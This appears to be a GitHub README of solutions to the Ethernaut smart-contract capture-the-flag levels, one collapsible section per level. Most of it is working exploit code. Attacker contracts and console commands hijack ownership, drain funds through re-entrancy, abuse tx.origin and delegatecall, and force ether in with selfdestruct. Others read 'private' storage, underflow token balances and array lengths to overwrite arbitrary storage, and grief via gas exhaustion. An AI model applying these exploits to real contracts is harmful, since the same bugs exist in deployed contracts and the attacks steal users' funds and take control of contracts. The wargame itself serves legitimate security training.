# ethernaut-ctf-solutions

<details>
    <summary>Level 1 - Fallback</summary>

```javascript
// first need to send some ether to contribute():
await contract.contribute({value: toWei("0.0001")})

// then send some raw ether, the fallback function will make us the owner
sendTransaction({from: player, to: instance, value: toWei("0.0001")})

// are we the owner yet?
await contract.owner() == player

// now that we're the owner, we can siphon the funds
await contract.withdraw()

// and double check that the contract has a balance of 0:
await getBalance(instance)
```

</details>

 <details>
    <summary>Level 2 - Fallout</summary>
    
```javascript
 /* constructor */
  function Fal1out() public payable    // <--- typo makes it not actually a constructor

// so just call this and you're the owner
await contract.Fal1out()
```

</details> 

 <details>
    <summary>Level 3 - Coin flip</summary>

Deploy this guesser contract, using e.g. Remix IDE:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip instance = CoinFlip(address(...));

  function guess() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    bool coinFlip = blockValue > FACTOR;
    require(instance.flip(coinFlip));
  }
}
```

Then repeatedly invoke the guess() function, calls will only go through when we know they will succeed in the `CoinFlip` contract.

</details> 

 <details>
    <summary>Level 4 - Telephone</summary>

Deploy this and call `ring_ring()`, we just need a smart contract to act as a buffer so that `msg.sender != tx.origin`. See also [rekt - THORChain](https://rekt.news/thorchain-rekt2/)

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract CallMeMaybe {
    Telephone instance = Telephone(address(...));
    
    function ring_ring() public {
        instance.changeOwner(msg.sender);
    }
}
```

</details> 

 <details>
    <summary>Level 5 - Token</summary>
    
```javascript
// trigger an underflow by transferring >20 tokens to any address
await contract.transfer("0xd4F3ae2100b186D5e8e0E41d7930bE7B3a3e9E6C", 100)
```

</details> 

 <details>
    <summary>Level 6 - Delegation</summary>
    
```javascript
// we want to hit the fallback function of the delegator, and pass it the selector of the pwn() function so that it invokes pwn() on the delegate

contract.sendTransaction({
    to: instance, 
    data: web3.eth.abi.encodeFunctionSignature("pwn()")
})

```

</details> 

 <details>
    <summary>Level 7 - Force</summary>

Relevant chapter in [Mastering Ethereum](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#unexpected-ether)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TakeMyMoney {
    fallback() external payable {}
    
    function boom(address payable _address) public {
        selfdestruct(_address);
    }
}
```

</details> 

 <details>
    <summary>🏦 Level 8 - Vault</summary>

Find the transaction that was used to create the contract on Etherscan, and look in the state change tab. We can see the value that was stored in the first variable: that's the password, then we just invoke unlock with it:

```javascript
await contract.unlock("0x...")
```

</details> 

 <details>
    <summary>👑 Level 9 - King</summary>

Trying to make this contract the king, it should refuse eth transfers, hence preventing the ownership transfer. Deploy it with 1 ETH, so that it has a starting balance.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface King {
    function _king() external view returns (address payable);
}

contract KingMaker {
    constructor() public payable {}
    
    function kingMe(address kingInstance) public {
        // send ether using a low-level call because send/transfer are limited to 2300 gas
      // send exactly 1 ether, because we need to pass the condition but not exceed the balance of the King contract
        kingInstance.call{value:1 ether}("");
        require(King(kingInstance)._king() == address(this));
    }
    
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

</details> 


 <details>
    <summary>🔁 Level 10 - Re-entrancy</summary>

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface Reentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Withdrawer {
    Reentrance instance = Reentrance(address(...));
    uint amount = 0.1 ether;
    
    constructor() payable {}
    
    // this is where we trigger the re-entrancy bug
    receive() external payable {
        if (address(instance).balance >= amount)  {
            instance.withdraw(amount);
        }
    }
    
    function pullTheTrigger() public {
        instance.donate{value: amount}(address(this));
        instance.withdraw(amount);
    }
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

</details> 


<details>
    <summary>☝️ Level 11 - Elevator</summary>

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface Elevator {
  function goTo(uint _floor) external;
}

contract Building {
    Elevator instance = Elevator(address(...));
    
    bool answer = true;
    
  function isLastFloor(uint) external returns (bool) {
      answer = !answer;
      return answer;
  }
 
  function justDoIt() public {
      instance.goTo(42);
  }
}
```

</details> 

<details>
    <summary>🤫 Level 12 - Privacy</summary>

```javascript
// read where data[2] is stored (in the fifth slot since there is some 
packing of smaller arguments going on):

await web3.eth.getStorageAt(instance, 5)

-> "0x658df6fba159ec7a1e678c38c33e7a77dd541772c97aeed1ad580b033885e238"

// turn that into a bytes16, which means calling unlock with the first half:

await contract.unlock('0x658df6fba159ec7a1e678c38c33e7a77')

```

</details> 

<details>
    <summary>💂‍♂️ Level 13 - Gatekeeper one</summary>

For the key value itself, need to replace the last 2 bytes with the end of the address used to send the transaction.

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface GatekeeperOne {
  function enter(bytes8 _gateKey) external returns(bool);
}

contract Enterer {
    GatekeeperOne instance = GatekeeperOne(address(...));
    event ErrorLog(string reason);

    // getting the gas left just right was difficult, I took some inspiration online to "fuzz" with the for loop
    function pullTheTrigger() public returns(bool) {
        for (uint256 i = 0; i < 120; i++) {
          try instance.enter{gas:i + 150 + 8191 * 3}(0xffffffff0000....) returns(bool result) {
              if (result) {
                  return result;
              }
          } catch Error(string memory reason) {
            emit ErrorLog(reason);
          } catch (bytes memory /*lowLevelData*/) {
            // This is executed in case revert() was used.
            emit ErrorLog("not the right amount of gas");
          }
        }
        return false;
    }
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

```

</details> 

<details>
    <summary>🐕 Level 14 - Gatekeeper two</summary>

```solidity
// SPDX-License-Identifier: MIT

// this is important, with newer Solidity versions, 
// `uint64(0) - 1` will fail because it relies on an underflow
pragma solidity ^0.6.0; 

interface GatekeeperTwo {
  function enter(bytes8 _gateKey) external returns(bool);
}

contract Enterer {
    constructor() public {
        uint64 hashedMe = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key = ~hashedMe;
        uint64 expected = uint64(0) - 1;
        
        require(hashedMe ^ key == expected, "wrong key");
        
        GatekeeperTwo instance = GatekeeperTwo(address(...));
        instance.enter(bytes8(key));
    }
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

```

</details> 

<details>
    <summary>👌 Level 15 - Naught coin</summary>

The timelock only applies to `transfer`, not `transferFrom` so we need to go with `approve` -> `transferFrom`

```solidity
> balance = (await contract.balanceOf(player)).toString()
"1000000000000000000000000"

> await contract.approve(player, '1000000000000000000000000')
> await contract.transferFrom(player, '0x...', '1000000000000000000000000')

> balance = (await contract.balanceOf(player)).toString()
"0"
```

</details> 

<details>
    <summary>⏰ Level 16 - Preservation</summary>

Deploy this first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract EvilDoer {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        timeZone1Library = address(this);
        timeZone2Library = address(this);
        owner = tx.origin;
    }

    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

```javascript
// then run this to stomp the address of timeZone1Library with evildoer
await contract.setFirstTime(evildoer);

// then let evildoer stomp the owner
await contract.setFirstTime(42);
```

</details> 

<details>
    <summary>⛑️ Level 17 - Recovery</summary>
Use etherscan to find the address the 0.5 ether was sent to.

```javascript
// getting the function selector:
web3.eth.abi.encodeFunctionSignature('destroy(address)')
"0x00f55d9d"

// getting the whole function invocation, including the selector:
web3.eth.abi.encodeFunctionCall({
   name: 'destroy',
   type: 'function',
   inputs: [{
       type: 'address',
       name: '_to'
   }]
}, [player]);

"0x00f55d9d000000000000000000000000....."

// making a low level call to self destruct it:
web3.eth.sendTransaction({from: player, to: tokenContract, data: "0x00f55d9d000000000000000000000000...."})
```

</details> 

<details>
    <summary>🧙‍♂️ Level 18 - Magic number</summary>

Let's make the tiniest solver in Yul:

```yul
// Solver.yul
object "Solver" {
    code {
        mstore(0x20, 42)
        return(0x20, 32)
    }
}
```

Build it:

```
> solc --strict-assembly Solver.yul

Warning: Yul is still experimental. Please use the output with care.

======= Solver.yul (EVM) =======

Pretty printed source:
object "Solver" {
    code {
        mstore(0x20, 42)
        return(0x20, 32)
    }
}


Binary representation:
602a60205260206020f3

Text representation:
    /* "Solver.yul":50:52   */
  0x2a
    /* "Solver.yul":44:48   */
  0x20
    /* "Solver.yul":37:53   */
  mstore
    /* "Solver.yul":75:77   */
  0x20
    /* "Solver.yul":69:73   */
  0x20
    /* "Solver.yul":62:78   */
  return
```

Take note of the binary representation. We want to deploy that, which is a bit tricky because we need to send a transaction to address 0 not with this code directly, but with code that returns this binary representation. I took the opportunity to learn about deployment code by writing a [raw_deployer](https://github.com/karmacoma-eth/yolo-evm#raw_deployerpy) script:

``` shell
> python raw_deployer.py 602a60205260206020f3       
600a8061000d6000396000f3fe602a60205260206020f3
```

Now we got the init code, we can create the contract:

```javascript
web3.eth.sendTransaction({
    from: player, 
/* no to address as we are creating a contract */ 
    data: "600a8061000d6000396000f3fe602a60205260206020f3"
})
```

Now just set the solver on the contract and we're done:

```javascript
await contract.setSolver('0x...')
```

</details> 


<details>
    <summary>👽 Level 19 - Alien codex</summary>

Relevant [Solidity docs](https://docs.soliditylang.org/en/v0.8.5/internals/layout_in_storage.html#mappings-and-dynamic-arrays):

>>> "Assume the storage location of the mapping or array ends up being a slot p after applying the storage layout rules. ... Array data is located starting at keccak256(p) and it is laid out in the same way as statically-sized array data would: One element after the other, potentially sharing storage slots if the elements are not longer than 16 bytes."

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface AlienCodex {
  function make_contact() external;
  function record(bytes32 _content) external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
}

contract Underhanded {
    AlienCodex instance = AlienCodex(address(0x...));
    event ErrorLog(string reason);

    function pullTheTrigger() public {
        instance.make_contact();
        
        // we need to underflow the length of the array, which is now 0xffffffff....
        instance.retract();
        
        // now we get to modify any storage we want
        // the base storage of the array is at 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
        // so to overwrite storage at slot 0, we calculate the index as hex(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1)
        instance.revise(
            0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a,
            0x0000000000000000000000008830c393b2ed864Bb3c1A2FB9Fce8dA83f6db66c
        );
    }
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

```

</details> 

<details>
    <summary>🙅‍♂️ Level 20 - Daniel</summary>
Just burn all the gas available in the receive() function since they didn't specify a gas stipend like `call.gas(100000).value()`

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Burner {
    event ErrorLog(string reason);

    receive() payable external {
        uint i = 0;
        while (gasleft() > 10) {
            i++;
        }
    }
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

</details> 

<details>
    <summary>🛍️ Level 21 - Shop</summary>
Idea: use the fact the Shop sets `sold = true` between the two calls: they paid for a storage change, and maybe we can look it up for cheap. However even with the following Solidity code I wasn't able to get it to run under the 3000 gas limit:

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface Shop {
  function isSold() external view returns(bool);
  function buy() external;
}

contract Buyer {
    Shop shop = Shop(address(0x...));

    function price() external view returns (uint) {
        return shop.isSold{gas: 2000}() ? 42 : 200;
    }
    
    function pullTheTrigger() public {
        shop.buy();
    }
}
```

It ended up working with the following Yul code:

```yul
object "Buyer" {
    code {
        // Deploy the contract
        datacopy(0, dataoffset("runtime"), datasize("runtime"))
        return(0, datasize("runtime"))
    }

    object "runtime" {
        code {
            // Dispatcher
            switch selector()

            case 0xa035b1fe /* "price()" */ {
                let price := 42
                if eq(isSold(), 0) {
                    price := 200
                }
                returnUint(price)
            }

            case 0xb760d418 /* "pullTheTrigger(address)" */ {
                buy()
                stop()
            }

            default {
                revert(0, 0)
            }

            /* ---------- calldata decoding functions ----------- */
            function selector() -> s {
                s := div(calldataload(0), 0x100000000000000000000000000000000000000000000000000000000)
            }

            /* ---------- calldata encoding functions ---------- */
            function returnUint(v) {
                mstore(0, v)
                return(0, 0x20)
            }

            /* ---------- utility functions ---------- */
            function isSold() -> sold {
                mstore(0, 0xe852e741) /* 'isSold()' */
                let succeeded := call(gas(), 0x4cb5aee9C212ae36C415A990a8913e2b29fc312C, 0, 28, 4, 0x20, 0x20)
                sold := mload(0x20)
            }

            function buy() {
                mstore(0, 0xa6f2ae3a) /* 'buy()' */
                let succeeded := call(gas(), 0x4cb5aee9C212ae36C415A990a8913e2b29fc312C, 0, 28, 4, 0, 0)
            }
        }
    }
}
```

Compile it:

```
> solc --strict-assembly --optimize Buyer.yul
```

Note the binary representation, deploy it:

```javascript
web3.eth.sendTransaction({from: player, data: '608f8061000f600039806000f350fe6000803560e01c63a035b1fe811460215763b760d41881146064578182fd608c565b602a63e852e7418352602060206004601c86734cb5aee9c212ae36c415a990a8913e2b29fc312c5af150602051151560585760c890505b80835250602082f3608c565b63a6f2ae3a825281826004601c85734cb5aee9c212ae36c415a990a8913e2b29fc312c5af150005b5050'})

// make sure the contract is fresh:
await contract.isSold()
-> false

// trigger the attack!
web3.eth.sendTransaction({from: player, to: '0x...', data: 'b760d418', gas: 100000})

await contract.isSold()
-> true

(await contract.price()).toString()
-> 42 
```

</details> 

<details>
    <summary>⚖️ Level 22 - Dex</summary>

Really anticlimactic final challenge, just keep swapping back and forth. The contract doesn't calculate the number of outgoing tokens properly, so it's losing liquidity every time 🤷‍♂️
</details> 